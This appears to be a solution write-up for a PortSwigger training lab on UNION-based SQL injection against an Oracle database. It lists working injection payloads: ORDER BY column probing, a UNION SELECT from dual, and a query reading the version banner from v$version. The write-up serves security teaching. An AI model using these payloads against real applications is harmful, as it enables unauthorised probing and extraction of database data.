[Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)  


## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on the **Gifts** category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to identify the number of columns returned by the query.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

- `ORDER BY 1` – Success
- `ORDER BY 2` – Success
- `ORDER BY 3` – Error

**Result:** The query returns two columns.

4. **Identify Text-Compatible Columns:** Test the columns using the following Oracle payload:

```sql
' UNION SELECT 'abc', 'def' FROM dual--
```

If the page loads successfully, both columns accept text data.

5. **Retrieve the Database Version:** Use the following payload:

```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

6. **Verify the Result:** The Oracle database version appears in the response, and the lab is marked as solved.

## Key Takeaways

- **UNION SELECT:** Combines results from multiple SQL queries.
- **ORDER BY:** Helps determine the number of columns.
- **NULL:** Useful for testing unknown column data types.
- **DUAL:** A special Oracle table used for selecting expressions.
- **v$version:** Oracle system view containing database version information.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Database:** Oracle
- **Tool:** Burp Suite
